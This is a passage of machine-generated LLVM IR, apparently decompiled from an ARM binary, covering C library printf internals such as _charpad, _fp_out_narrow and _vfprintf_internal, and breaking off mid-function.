dec_label_pc_23804:                               ; preds = %dec_label_pc_23790, %dec_label_pc_23788, %dec_label_pc_237ec, %dec_label_pc_237e4
  %v0_23804 = load i32, i32* %r6.global-to-local, align 4
  %v2_23808 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_23808, i32* %r4.global-to-local, align 4
  store i32 %v6_236cc, i32* %r5.global-to-local, align 4
  store i32 %v9_236cc, i32* %r6.global-to-local, align 4
  ret i32 %v0_23804

; uselistorder directives
  uselistorder i32 %v0_237d8, { 1, 0, 2 }
  uselistorder i32 %v1_237bc.pre, { 0, 2, 1 }
  uselistorder i32 %v1_23710.pre, { 1, 0 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 12, 11, 1, 13 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 12, 11, 1, 13, 14 }
  uselistorder i32 (i32, i8*)* @_vfprintf_internal, { 1, 0 }
  uselistorder label %dec_label_pc_23804, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_237dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_237c4, { 1, 0 }
  uselistorder label %dec_label_pc_23788, { 1, 0 }
  uselistorder label %dec_label_pc_2374c, { 1, 0 }
  uselistorder label %dec_label_pc_23740, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %dec_label_pc_23730, { 2, 1, 0 }
  uselistorder label %dec_label_pc_23718, { 1, 0 }
}

define i32 @_charpad(i32 %arg1, i8 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-25 = alloca i8, align 1
  %v3_23810 = load i32, i32* @r4, align 4
  %v6_23810 = load i32, i32* @r5, align 4
  %v9_23810 = load i32, i32* @r6, align 4
  %v12_23810 = load i32, i32* @r7, align 4
  store i8 %arg2, i8* %stack_var_-25, align 1
  %v10_2381c = ptrtoint i8* %stack_var_-25 to i32
  store i32 %v10_2381c, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %v2_238342 = icmp eq i32 %arg3, 0
  br i1 %v2_238342, label %dec_label_pc_23854, label %dec_label_pc_23848

dec_label_pc_23830:                               ; preds = %dec_label_pc_23848
  %v1_23830 = add i32 %v0_23830, -1
  store i32 %v1_23830, i32* @r4, align 4
  %v2_23834 = icmp eq i32 %v1_23830, 0
  %v0_23840 = load i32, i32* @r7, align 4
  br i1 %v2_23834, label %dec_label_pc_23854.loopexit, label %dec_label_pc_23848

dec_label_pc_23848:                               ; preds = %entry, %dec_label_pc_23830
  %v0_238404 = phi i32 [ %v0_23840, %dec_label_pc_23830 ], [ %arg1, %entry ]
  %v3_23848 = inttoptr i32 %v0_238404 to i16*
  %v4_23848 = call i32 @__stdio_fwrite(i32 %v10_2381c, i32 1, i16* %v3_23848)
  %v7_2384c = icmp eq i32 %v4_23848, 1
  %v0_23830 = load i32, i32* @r4, align 4
  br i1 %v7_2384c, label %dec_label_pc_23830, label %dec_label_pc_23854.loopexit

dec_label_pc_23854.loopexit:                      ; preds = %dec_label_pc_23830, %dec_label_pc_23848
  %v0_23854.ph = phi i32 [ %v0_23830, %dec_label_pc_23848 ], [ 0, %dec_label_pc_23830 ]
  %v1_23854.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_23854

dec_label_pc_23854:                               ; preds = %dec_label_pc_23854.loopexit, %entry
  %v1_23854 = phi i32 [ 0, %entry ], [ %v1_23854.pre, %dec_label_pc_23854.loopexit ]
  %v0_23854 = phi i32 [ 0, %entry ], [ %v0_23854.ph, %dec_label_pc_23854.loopexit ]
  %v2_23854 = sub i32 %v1_23854, %v0_23854
  store i32 %v3_23810, i32* @r4, align 4
  store i32 %v6_23810, i32* @r5, align 4
  store i32 %v9_23810, i32* @r6, align 4
  store i32 %v12_23810, i32* @r7, align 4
  ret i32 %v2_23854

; uselistorder directives
  uselistorder i32 %v1_23830, { 1, 0 }
  uselistorder label %dec_label_pc_23854.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_23848, { 1, 0 }
}

define i32 @_fp_out_narrow(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_23864 = load i32, i32* @r4, align 4
  store i32 %v3_23864, i32* %stack_var_-24, align 4
  %v6_23864 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  %v1_2386c = and i32 %arg2, 128
  %v2_2386c = icmp eq i32 %v1_2386c, 0
  %v0_23870 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_23870, i32* @r8, align 4
  store i32 %arg3, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* @r7, align 4
  br i1 %v2_2386c, label %dec_label_pc_238c0thread-pre-split, label %dec_label_pc_23884

dec_label_pc_23884:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_23888 = call i32 @strlen(i8* %arg4)
  store i32 %v3_23888, i32* %r0.global-to-local, align 4
  %v1_2388c = load i32, i32* %r4.global-to-local, align 4
  %v2_2388c = sub i32 %v1_2388c, %v3_23888
  store i32 %v2_2388c, i32* @r4, align 4
  store i32 %v3_23888, i32* @r6, align 4
  %tmp13 = icmp slt i32 %v2_2388c, 1
  br i1 %tmp13, label %.thread, label %dec_label_pc_238a0

.thread:                                          ; preds = %dec_label_pc_23884
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_238bc

dec_label_pc_238a0:                               ; preds = %dec_label_pc_23884
  %v0_238a0 = load i32, i32* @r5, align 4
  %v1_238a0 = urem i32 %v0_238a0, 128
  %v0_238a4 = load i32, i32* @r8, align 4
  store i32 %v0_238a4, i32* %r0.global-to-local, align 4
  %v3_238ac = trunc i32 %v1_238a0 to i8
  %v4_238ac = call i32 @_charpad(i32 %v0_238a4, i8 %v3_238ac, i32 %v2_2388c)
  store i32 %v4_238ac, i32* %r0.global-to-local, align 4
  %v1_238b0 = load i32, i32* @r4, align 4
  %v9_238b0 = icmp eq i32 %v4_238ac, %v1_238b0
  store i32 %v4_238ac, i32* %r5.global-to-local, align 4
  br i1 %v9_238b0, label %dec_label_pc_238a0.dec_label_pc_238bc_crit_edge, label %dec_label_pc_238dc

dec_label_pc_238a0.dec_label_pc_238bc_crit_edge:  ; preds = %dec_label_pc_238a0
  %v0_238bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_238bc

dec_label_pc_238bc:                               ; preds = %.thread, %dec_label_pc_238a0.dec_label_pc_238bc_crit_edge
  %v0_238bc = phi i32 [ %v0_238bc.pre, %dec_label_pc_238a0.dec_label_pc_238bc_crit_edge ], [ %v3_23888, %.thread ]
  store i32 %v0_238bc, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_238c0

dec_label_pc_238c0thread-pre-split:               ; preds = %entry
  store i32 0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_238c0

dec_label_pc_238c0:                               ; preds = %dec_label_pc_238c0thread-pre-split, %dec_label_pc_238bc
  %v5_238cc = phi i32 [ %arg3, %dec_label_pc_238c0thread-pre-split ], [ %v0_238bc, %dec_label_pc_238bc ]
  %tmp14 = icmp slt i32 %v5_238cc, 1
  br i1 %tmp14, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_238c0
  br label %bb15

bb:                                               ; preds = %dec_label_pc_238c0
  %v5_238c8 = load i32, i32* @r7, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb
  %storemerge = phi i32 [ 0, %.thread5 ], [ %v5_238c8, %bb ]
  %tmp16 = phi i1 [ false, %.thread5 ], [ true, %bb ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 %tmp16, i32 ptrtoint (i32* @global_var_2a8dc.3093 to i32))
  %v0_238d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_238d8 = add i32 %storemerge, %v0_238d8
  store i32 %v2_238d8, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_238dc

dec_label_pc_238dc:                               ; preds = %dec_label_pc_238a0, %bb15
  %v0_238dc = phi i32 [ %v4_238ac, %dec_label_pc_238a0 ], [ %v2_238d8, %bb15 ]
  store i32 %v0_238dc, i32* %r0.global-to-local, align 4
  %v2_238e0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_238e0, i32* %r4.global-to-local, align 4
  store i32 %v6_23864, i32* %r5.global-to-local, align 4
  ret i32 %v0_238dc

; uselistorder directives
  uselistorder i32 %v0_238dc, { 1, 0 }
  uselistorder i32 %v0_238bc, { 1, 0 }
  uselistorder i32 %v2_2388c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 5, 4, 7, 6, 1, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_238dc, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_238bc, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp98 = call i32 @__decompiler_undefined_function_0()
  %tmp99 = call i32 @__decompiler_undefined_function_0()
  %tmp102 = call i8 @__decompiler_undefined_function_3()
  %tmp103 = call i32 @__decompiler_undefined_function_0()
  %tmp104 = call i32 @__decompiler_undefined_function_0()
  %tmp105 = call i32 @__decompiler_undefined_function_0()
  %tmp106 = call i8 @__decompiler_undefined_function_3()
  %tmp107 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-73 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %v6_238e8 = load i32, i32* @r5, align 4
  %v9_238e8 = load i32, i32* @r6, align 4
  %v12_238e8 = load i32, i32* @r7, align 4
  %v15_238e8 = load i32, i32* @r8, align 4
  %v18_238e8 = load i32, i32* @sb, align 4
  %v21_238e8 = load i32, i32* @sl, align 4
  %v24_238e8 = load i32, i32* @fp, align 4
  %v2_238f0 = ptrtoint i32* %stack_var_-352 to i32
  store i32 %v2_238f0, i32* @r6, align 4
  store i32 %arg1, i32* @fp, align 4
  store i32 %v2_238f0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_23900 = load i32, i32* @r2, align 4
  store i32 %v0_23900, i32* @r5, align 4
  %v2_23904 = call i32 @_ppfs_init(i32* nonnull %stack_var_-352)
  store i32 %v2_23904, i32* %r0.global-to-local, align 4
  %v1_2390c = icmp slt i32 %v2_23904, 0
  br i1 %v1_2390c, label %dec_label_pc_2391c, label %dec_label_pc_23950

dec_label_pc_2391c:                               ; preds = %entry
  %v3_2391c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_2391c, i32* @r4, align 4
  %v1_23920 = inttoptr i32 %v3_2391c to i8*
  store i32 %v3_2391c, i32* %r0.global-to-local, align 4
  %v3_23924 = call i32 @strlen(i8* %v1_23920)
  store i32 %v3_23924, i32* %r0.global-to-local, align 4
  %v2_23928 = icmp eq i32 %v3_23924, 0
  br i1 %v2_23928, label %bb, label %dec_label_pc_23938

bb:                                               ; preds = %dec_label_pc_2391c
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_23fa8

dec_label_pc_23938:                               ; preds = %dec_label_pc_2391c
  %v0_23938 = load i32, i32* @r4, align 4
  store i32 %v0_23938, i32* %r0.global-to-local, align 4
  %v0_2393c = load i32, i32* @fp, align 4
  store i32 %v0_2393c, i32* %r2.global-to-local, align 4
  %v3_23940 = inttoptr i32 %v0_2393c to i16*
  %v4_23940 = call i32 @__stdio_fwrite(i32 %v0_23938, i32 %v3_23924, i16* %v3_23940)
  store i32 %v4_23940, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_23fa8

dec_label_pc_23950:                               ; preds = %entry
  %v0_23950 = load i32, i32* @r5, align 4
  store i32 %v2_238f0, i32* %r0.global-to-local, align 4
  %v2_23958 = call i32 @_ppfs_prepargs(i32 %v2_238f0, i32 %v0_23950)
  store i32 %v2_23958, i32* %r0.global-to-local, align 4
  %v0_239a0 = load i32, i32* @r4, align 4
  store i32 %v0_239a0, i32* %r2.global-to-local, align 4
  %v1_23a24 = bitcast i32* %stack_var_-352 to i8*
  %v4_23a34 = zext i8 %tmp106 to i32
  %tmp137 = icmp slt i32 %tmp107, 1
  %v7_23a40 = ptrtoint i32* %stack_var_-272 to i32
  %v2_23a58 = ptrtoint i32* %stack_var_-40 to i32
  %v2_23a74 = icmp eq i32 %tmp104, 0
  %v2_23db8 = ptrtoint i32* %stack_var_-200 to i32
  %v2_23df8 = ptrtoint i32* %stack_var_-348 to i32
  %v2_23dfc = ptrtoint i32* %stack_var_-72 to i32
  %v2_23ca8 = ptrtoint i32* %stack_var_-44 to i32
  %v2_23cb4 = ptrtoint i32* %stack_var_-52 to i32
  %v7_23b10 = zext i8 %tmp102 to i32
  %v2_23b48 = ptrtoint i32* %stack_var_-73 to i32
  %v1_23b50 = bitcast i32* %stack_var_-73 to i8*
  %v2_23b58 = icmp ugt i32 %tmp104, 4
  %v7_23b58 = icmp eq i32 %tmp104, 5
  %v7_23a3c = ptrtoint i32* %stack_var_-280 to i32
  %v5_23a6c195 = icmp sgt i32 %tmp105, 0
  %tmp207 = icmp ugt i32 %tmp104, 7
  %tmp208 = icmp ugt i32 %tmp104, 15
  %v2_23c7c = icmp ugt i32 %tmp104, 16
  %v7_23c7c = icmp eq i32 %tmp104, 17
  %v2_23c80 = xor i1 %v7_23c7c, true
  %v3_23c80 = and i1 %v2_23c7c, %v2_23c80
  %v2_23d04 = icmp ugt i32 %tmp104, 18
  %v7_23d04 = icmp eq i32 %tmp104, 19
  %v2_23d08 = xor i1 %v7_23d04, true
  %v3_23d08 = and i1 %v2_23d04, %v2_23d08
  %v7_23da0 = icmp eq i32 %tmp104, 20
  %v1_23ab8 = add i32 %tmp104, add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 -37537)
  %v2_23ab8 = inttoptr i32 %v1_23ab8 to i8*
  %v2_23ae4 = xor i1 %v7_23b58, true
  %v3_23ae4 = and i1 %v2_23b58, %v2_23ae4
  %v7_23b18 = icmp eq i32 %tmp104, 1
  %v2_23b60 = xor i1 %v2_23b58, true
  %v3_23b60 = or i1 %v7_23b58, %v2_23b60
  %tmp209 = icmp ult i32 %tmp104, 3
  %v7_23bc8 = icmp eq i32 %tmp104, 3
  %v11_23bd4 = icmp eq i32 %tmp104, 4
  %v9_23a44 = mul nuw nsw i32 %v4_23a34, 8
  %v10_23a44 = add i32 %v7_23a3c, %v9_23a44
  br label %dec_label_pc_239a4.outer

dec_label_pc_239a4.outer:                         ; preds = %dec_label_pc_23f8c, %dec_label_pc_23950
  %v0_239a445 = phi i32 [ %v3_23f8c, %dec_label_pc_23f8c ], [ %v0_239a0, %dec_label_pc_23950 ]
  %v0_23ad8 = phi i32 [ %stack_var_-336.4, %dec_label_pc_23f8c ], [ %tmp103, %dec_label_pc_23950 ]
  %stack_var_-356.1.ph = phi i32 [ %stack_var_-356.3, %dec_label_pc_23f8c ], [ 0, %dec_label_pc_23950 ]
  br label %dec_label_pc_239a4.outer36

dec_label_pc_239a4.outer36:                       ; preds = %dec_label_pc_239a4.outer, %dec_label_pc_23f98
  %v0_239a444 = phi i32 [ %v0_239a445, %dec_label_pc_239a4.outer ], [ %v1_23f98, %dec_label_pc_23f98 ]
  %v5_239d0 = phi i32 [ %v0_239a445, %dec_label_pc_239a4.outer ], [ %v1_23a00, %dec_label_pc_23f98 ]
  %stack_var_-356.1.ph37 = phi i32 [ %stack_var_-356.1.ph, %dec_label_pc_239a4.outer ], [ %v1_23e78, %dec_label_pc_23f98 ]
  %v1_239a4188 = inttoptr i32 %v0_239a444 to i8*
  %v2_239a4189 = load i8, i8* %v1_239a4188, align 1
  %v2_239a8191 = icmp eq i8 %v2_239a4189, 0
  br i1 %v2_239a8191, label %dec_label_pc_239c0, label %bb138

bb138:                                            ; preds = %dec_label_pc_239a4.outer36, %.thread6
  %v2_239a4193 = phi i8 [ %v2_239a4, %.thread6 ], [ %v2_239a4189, %dec_label_pc_239a4.outer36 ]
  %v1_239b8192 = phi i32 [ %v2_239b8, %.thread6 ], [ %v0_239a444, %dec_label_pc_239a4.outer36 ]
  %v8_239ac = icmp eq i8 %v2_239a4193, 37
  br i1 %v8_239ac, label %dec_label_pc_239c0, label %.thread6

.thread6:                                         ; preds = %bb138
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_239b8 = add i32 %v1_239b8192, 1
  store i32 %v2_239b8, i32* @r4, align 4
  %v1_239a4 = inttoptr i32 %v2_239b8 to i8*
  %v2_239a4 = load i8, i8* %v1_239a4, align 1
  %v2_239a8 = icmp eq i8 %v2_239a4, 0
  br i1 %v2_239a8, label %dec_label_pc_239c0, label %bb138

dec_label_pc_239c0:                               ; preds = %bb138, %.thread6, %dec_label_pc_239a4.outer36
  %v1_239b8.lcssa = phi i32 [ %v0_239a444, %dec_label_pc_239a4.outer36 ], [ %v2_239b8, %.thread6 ], [ %v1_239b8192, %bb138 ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_239c0 = sub i32 %v1_239b8.lcssa, %v5_239d0
  %v9_239c0 = icmp eq i32 %v1_239b8.lcssa, %v5_239d0
  br i1 %v9_239c0, label %dec_label_pc_239f4, label %dec_label_pc_239c8

dec_label_pc_239c8:                               ; preds = %dec_label_pc_239c0
  store i32 %v2_239c0, i32* @r5, align 4
  %tmp140 = icmp slt i32 %v2_239c0, 1
  br i1 %tmp140, label %bb142, label %bb141

bb141:                                            ; preds = %dec_label_pc_239c8
  store i32 %v5_239d0, i32* %r0.global-to-local, align 4
  %v5_239d8 = load i32, i32* @fp, align 4
  store i32 %v5_239d8, i32* %r2.global-to-local, align 4
  br label %bb142

bb142:                                            ; preds = %dec_label_pc_239c8, %bb141
  %tmp143 = phi i1 [ true, %bb141 ], [ false, %dec_label_pc_239c8 ]
  store i32 145888, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp143, i32 ptrtoint (i32* @global_var_2a8dc.3093 to i32))
  %v0_239e0 = load i32, i32* %r0.global-to-local, align 4
  %v1_239e0 = load i32, i32* @r5, align 4
  %v9_239e0 = icmp eq i32 %v0_239e0, %v1_239e0
  br i1 %v9_239e0, label %dec_label_pc_239e8, label %dec_label_pc_23fa0

dec_label_pc_239e8:                               ; preds = %bb142
  %v2_239ec = add i32 %v0_239e0, %stack_var_-356.1.ph37
  %v0_239f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_239f4

dec_label_pc_239f4:                               ; preds = %dec_label_pc_239c0, %dec_label_pc_239e8
  %v0_23a08 = phi i32 [ %v5_239d0, %dec_label_pc_239c0 ], [ %v0_239f4.pre, %dec_label_pc_239e8 ]
  %v1_23e78 = phi i32 [ %stack_var_-356.1.ph37, %dec_label_pc_239c0 ], [ %v2_239ec, %dec_label_pc_239e8 ]
  %v1_239f4 = inttoptr i32 %v0_23a08 to i8*
  %v2_239f4 = load i8, i8* %v1_239f4, align 1
  %v2_239f8 = icmp eq i8 %v2_239f4, 0
  br i1 %v2_239f8, label %dec_label_pc_23fa8, label %dec_label_pc_23a00

dec_label_pc_23a00:                               ; preds = %dec_label_pc_239f4
  %v1_23a00 = add i32 %v0_23a08, 1
  %v2_23a00 = inttoptr i32 %v1_23a00 to i8*
  %v3_23a00 = load i8, i8* %v2_23a00, align 1
  %v7_23a04 = icmp eq i8 %v3_23a00, 37
  store i32 %v1_23a00, i32* %r2.global-to-local, align 4
  br i1 %v7_23a04, label %dec_label_pc_23f98, label %dec_label_pc_23a10

dec_label_pc_23a10:                               ; preds = %dec_label_pc_23a00
  store i32 %v2_238f0, i32* @r4, align 4
  store i32 %v2_238f0, i32* %r0.global-to-local, align 4
  store i32 %v1_23a00, i32* %stack_var_-352, align 4
  store i32 0, i32* %stack_var_-44, align 4
  %v2_23a24 = call i32 @_ppfs_parsespec(i8* %v1_23a24)
  store i32 %v2_238f0, i32* @r0, align 4
  %v0_23a2c = call i32 @_ppfs_setargs()
  store i32 %v0_23a2c, i32* %r0.global-to-local, align 4
  store i32 %v4_23a34, i32* @ip, align 4
  br i1 %tmp137, label %bb146, label %bb145

bb145:                                            ; preds = %dec_label_pc_23a10
  br label %bb146

bb146:                                            ; preds = %dec_label_pc_23a10, %bb145
  %storemerge = phi i32 [ %v10_23a44, %bb145 ], [ %v7_23a40, %dec_label_pc_23a10 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br i1 %v5_23a6c195, label %dec_label_pc_23a50, label %dec_label_pc_23a70

dec_label_pc_23a50:                               ; preds = %bb146, %dec_label_pc_23a50
  %v5_23a5c197 = phi i32 [ %v5_23a5c, %dec_label_pc_23a50 ], [ %v2_23a58, %bb146 ]
  %v0_23a50196 = phi i32 [ %v1_23a54, %dec_label_pc_23a50 ], [ %storemerge, %bb146 ]
  %v2_23a50 = add i32 %v5_23a5c197, -32
  %v3_23a50 = inttoptr i32 %v2_23a50 to i32*
  store i32 %v0_23a50196, i32* %v3_23a50, align 4
  %v0_23a54 = load i32, i32* %r0.global-to-local, align 4
  %v1_23a54 = add i32 %v0_23a54, 8
  store i32 %v1_23a54, i32* %r0.global-to-local, align 4
  %v1_23a5c.pre = load i32, i32* %r2.global-to-local, align 4
  %v4_23a5c = mul i32 %v1_23a5c.pre, 4
  %v5_23a5c = add i32 %v4_23a5c, %v2_23a58
  %v1_23a68 = add i32 %v1_23a5c.pre, 1
  store i32 %v1_23a68, i32* %r2.global-to-local, align 4
  %v5_23a6c = icmp slt i32 %v1_23a5c.pre, %tmp105
  br i1 %v5_23a6c, label %dec_label_pc_23a50, label %dec_label_pc_23a70

dec_label_pc_23a70:                               ; preds = %dec_label_pc_23a50, %bb146
  store i32 %tmp104, i32* %r2.global-to-local, align 4
  br i1 %v2_23a74, label %dec_label_pc_23a7c, label %dec_label_pc_23aa0

dec_label_pc_23a7c:                               ; preds = %dec_label_pc_23a70
  %v3_23a7c = load i32, i32* %stack_var_-72, align 4
  %v1_23a88 = inttoptr i32 %v3_23a7c to i32*
  %v2_23a88 = load i32, i32* %v1_23a88, align 4
  store i32 %v2_23a88, i32* %r0.global-to-local, align 4
  %v1_23a8c = and i32 %v0_23ad8, 3840
  store i32 %v1_23e78, i32* %r2.global-to-local, align 4
  %v3_23a94 = ashr i32 %v1_23e78, 31
  %v4_23a98 = inttoptr i32 %v2_23a88 to i16*
  %v5_23a98 = call i32 @_store_inttype(i16* %v4_23a98, i32 %v1_23a8c, i32 %v1_23e78, i32 %v3_23a94)
  store i32 %v5_23a98, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_23f8c

dec_label_pc_23aa0:                               ; preds = %dec_label_pc_23a70
  br i1 %tmp207, label %dec_label_pc_23c3c, label %dec_label_pc_23aa8

dec_label_pc_23aa8:                               ; preds = %dec_label_pc_23aa0
  %v3_23ab8 = load i8, i8* %v2_23ab8, align 1
  %v4_23ab8 = zext i8 %v3_23ab8 to i32
  %v7_23abc = icmp eq i8 %v3_23ab8, 10
  br i1 %v7_23abc, label %dec_label_pc_23ac8, label %bb147

bb147:                                            ; preds = %dec_label_pc_23aa8
  br label %bb151

dec_label_pc_23ac8:                               ; preds = %dec_label_pc_23aa8
  %v1_23ad8 = and i32 %v0_23ad8, 64
  %v2_23ad8 = icmp eq i32 %v1_23ad8, 0
  br i1 %v2_23ad8, label %bb151, label %bb150

bb150:                                            ; preds = %dec_label_pc_23ac8
  br label %bb151

bb151:                                            ; preds = %bb147, %dec_label_pc_23ac8, %bb150
  br i1 %v3_23ae4, label %.thread, label %dec_label_pc_23aec

.thread:                                          ; preds = %bb151
  %v5_23ae4 = sub nsw i32 0, %v4_23ab8
  br label %dec_label_pc_23b04

dec_label_pc_23aec:                               ; preds = %bb151
  br i1 %v7_23bc8, label %bb152, label %dec_label_pc_23af8

bb152:                                            ; preds = %dec_label_pc_23aec
  br label %dec_label_pc_23b04

dec_label_pc_23af8:                               ; preds = %dec_label_pc_23aec
  br i1 %v7_23b18, label %dec_label_pc_23b08, label %dec_label_pc_23b04

dec_label_pc_23b04:                               ; preds = %.thread, %bb152, %dec_label_pc_23af8
  %v0_23b3081 = phi i32 [ %v5_23ae4, %.thread ], [ %v4_23ab8, %bb152 ], [ %v4_23ab8, %dec_label_pc_23af8 ]
  br label %dec_label_pc_23b08

dec_label_pc_23b08:                               ; preds = %dec_label_pc_23af8, %dec_label_pc_23b04
  %v0_23b3080 = phi i32 [ %v0_23b3081, %dec_label_pc_23b04 ], [ %v4_23ab8, %dec_label_pc_23af8 ]
  %storemerge91 = phi i32 [ 11, %dec_label_pc_23b04 ], [ 6, %dec_label_pc_23af8 ]
  store i32 %storemerge91, i32* @r6, align 4
  %v3_23b08 = load i32, i32* %stack_var_-348, align 4
  %v1_23b0c = icmp slt i32 %v3_23b08, 0
  %v7_23b10. = select i1 %v1_23b0c, i32 %v7_23b10, i32 32
  store i32 %v7_23b10., i32* @sb, align 4
  br i1 %v7_23b18, label %bb157, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_23b08
  store i32 %v2_23a58, i32* %r2.global-to-local, align 4
  %v2_23b20 = load i32, i32* @ip, align 4
  %v5_23b20 = mul i32 %v2_23b20, 4
  %v6_23b20 = add i32 %v5_23b20, %v2_23a58
  %v2_23b24 = add i32 %v6_23b20, -276
  %v3_23b24 = inttoptr i32 %v2_23b24 to i32*
  %v4_23b24 = load i32, i32* %v3_23b24, align 4
  %v2_23b2c = and i32 %v4_23b24, 3840
  br label %bb157

bb157:                                            ; preds = %dec_label_pc_23b08, %.thread15
  %storemerge93 = phi i32 [ %v2_23b2c, %.thread15 ], [ 1024, %dec_label_pc_23b08 ]
  store i32 %storemerge93, i32* @r0, align 4
  store i32 %v0_23b3080, i32* @r2, align 4
  %v3_23b34 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_23b34, i32* @r1, align 4
  %v0_23b38 = call i32 @_load_inttype()
  store i32 %v0_23b38, i32* @r2, align 4
  %v0_23b44 = load i32, i32* @r1, align 4
  store i32 %v0_23b44, i32* @r3, align 4
  store i32 %v2_23b48, i32* %r0.global-to-local, align 4
  %v2_23b50 = call i32 @_uintmaxtostr(i8* %v1_23b50)
  store i32 %v2_23b50, i32* %r0.global-to-local, align 4
  store i32 %v2_23b50, i32* @r4, align 4
  br i1 %v3_23b60, label %bb160, label %dec_label_pc_23b64

dec_label_pc_23b64:                               ; preds = %bb157
  %v3_23b50 = inttoptr i32 %v2_23b50 to i8*
  %v3_23b64 = load i8, i8* %v3_23b50, align 1
  %v7_23b68 = icmp eq i8 %v3_23b64, 45
  %v2_23b70 = or i32 %v0_23ad8, 2
  %v2_23b70.stack_var_-336.0 = select i1 %v7_23b68, i32 %v2_23b70, i32 %v0_23ad8
  br i1 %v7_23b68, label %.thread17, label %dec_label_pc_23b84

.thread17:                                        ; preds = %dec_label_pc_23b64
  %v3_23b74 = add i32 %v2_23b50, 1
  store i32 %v3_23b74, i32* @r4, align 4
  store i32 2, i32* @r6, align 4
  br label %bb160

dec_label_pc_23b84:                               ; preds = %dec_label_pc_23b64
  %v1_23b84 = and i32 %v2_23b70.stack_var_-336.0, 2
  %v2_23b84 = icmp eq i32 %v1_23b84, 0
  br i1 %v2_23b84, label %dec_label_pc_23b90, label %bb158

bb158:                                            ; preds = %dec_label_pc_23b84
  store i32 0, i32* @r6, align 4
  br label %bb160

dec_label_pc_23b90:                               ; preds = %dec_label_pc_23b84
  %v1_23b90 = urem i32 %v2_23b70.stack_var_-336.0, 2
  %v2_23b90 = icmp eq i32 %v1_23b90, 0
  br i1 %v2_23b90, label %bb160, label %bb159

bb159:                                            ; preds = %dec_label_pc_23b90
  store i32 4, i32* @r6, align 4
  br label %bb160

bb160:                                            ; preds = %.thread17, %bb158, %bb157, %dec_label_pc_23b90, %bb159
  %v0_23bec = phi i32 [ %v2_23b50, %bb157 ], [ %v3_23b74, %.thread17 ], [ %v2_23b50, %dec_label_pc_23b90 ], [ %v2_23b50, %bb159 ], [ %v2_23b50, %bb158 ]
  %v0_23ba8 = phi i32 [ %v0_23ad8, %bb157 ], [ %v2_23b70, %.thread17 ], [ %v0_23ad8, %dec_label_pc_23b90 ], [ %v0_23ad8, %bb159 ], [ %v0_23ad8, %bb158 ]
  %v3_23b98 = load i32, i32* %stack_var_-348, align 4
  %v1_23ba0 = icmp slt i32 %v3_23b98, 0
  br i1 %v1_23ba0, label %bb161, label %bb162

bb161:                                            ; preds = %bb160
  br label %bb162

bb162:                                            ; preds = %bb160, %bb161
